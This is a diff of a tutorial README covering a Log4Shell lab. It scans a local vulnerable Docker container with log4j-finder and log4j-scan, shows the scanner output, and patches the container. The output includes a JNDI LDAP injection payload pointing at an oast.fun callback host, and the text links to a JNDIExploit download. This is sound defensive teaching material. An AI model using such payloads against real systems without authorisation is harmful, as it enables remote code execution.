@@ -128,7 +128,7 @@ One of the best resources for *Log4J* is [`NCSC-NL/log4shell` GitHub Page](https
 
 We will be using 2 tools mentioned in this repository. 
 
-### 1. [log4j-finder](https://github.com/fox-it/log4j-finder)
+### [1. log4j-finder](https://github.com/fox-it/log4j-finder)
 
 [log4j-finder](https://github.com/fox-it/log4j-finder) "identifies `log4j2` libraries on your filesystem using a list of *known bad* and *known good* MD5 hashes of specific files". This means that it runs locally on the machine instead of scanning externally. To scan for the Log4J vulnerability, you will have to get into a termial of the docker container. While the container is running, use the following command: 
 
@@ -163,15 +163,62 @@ Summary:
   Found 1 vulnerable files
 ```
 
-### 2. [log4j-scan](https://github.com/fullhunt/log4j-scan) 
+### [2. log4j-scan](https://github.com/fullhunt/log4j-scan) 
 
 This tool can be used to exterally scan for *Log4J*. It is an "open detection and scanning tool (Python) for discovering and fuzzing for Log4J vulnerability". Due to it's ability to scan many devices it's perfect for security professionals who manage large scale opperations.  
 
-> 🚧 Bug in Code 
+> 🚧 **Bug in Code** 
 >
-> As outlined in [Issue #131}(https://github.com/fullhunt/log4j-scan/issues/131), if you run the version directly from the GitHub page it will fail to run. Due to this, I have included the fix (changeing `interact.sh` to `oast.fun`) in this repo named `./log4j-scan.py`. Thank you [akr3ch](https://github.com/akr3ch) for figuring this out. 
+> As outlined in [Issue #131](https://github.com/fullhunt/log4j-scan/issues/131), if you run the version directly from the GitHub page it will fail to run. Due to this, I have included the fix (changeing `interact.sh` to `oast.fun`) in this repo named `log4j-scan.py`. Thank you [akr3ch](https://github.com/akr3ch) for figuring this out. 
 
+To do an external scan on our container, type the following: 
 
+```sh
+python3 log4j-scan.py -u http://localhost:8080
+```
+
+You should see an output that looks like this: 
+
+```
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://localhost:8080
+[•] URL: http://localhost:8080 | PAYLOAD: ${jndi:ldap://localhost.858m2k2su8u8442396146322h0030f7np.oast.fun/w0aeksw}
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[!!!] Targets Affected
+{"timestamp": "2022-11-21T06:38:54.364668258Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
+{"timestamp": "2022-11-21T06:38:54.365665371Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
+{"timestamp": "2022-11-21T06:38:54.367763352Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "172.217.36.130"}
+{"timestamp": "2022-11-21T06:38:54.576959288Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
+{"timestamp": "2022-11-21T06:38:54.578630056Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
+{"timestamp": "2022-11-21T06:38:54.67594304Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
+{"timestamp": "2022-11-21T06:38:54.680139615Z", "host": "localhost.858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.75"}
+{"timestamp": "2022-11-21T06:38:54.890413322Z", "host": "858m2k2su8u8442396146322h0030f7np.858m2k2su8u8442396146322h0030f7np.oast.fun", "remote_address": "146.112.137.74"}
+```
+
+This means our server is vulnerable
+
+## Fixing the Server 
+
+Our server is vulnerable. Not only have we been hacked but our interal and exteral scans show that we are vulnerable. As good pratitioners of cybersecurity we need to patch this. 
+
+First, we will update the docker container. Get back inside the docker container with: 
+
+```sh
+docker exec -it vulnerable-app /bin/sh
+```
+
+Inside the container, update the system: 
+
+```sh 
+apk update && apk upgrade
+```
+
+After this, if you rerun the scanners, [log4j-scan](https://github.com/fullhunt/log4j-scan) will not dectect a vunerablity but [log4j-finder](https://github.com/fox-it/log4j-finder) will. Althought if you try and do the exploit with [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) it will not work. 
 
 ## Log4J Vulnerable Code Explained
 
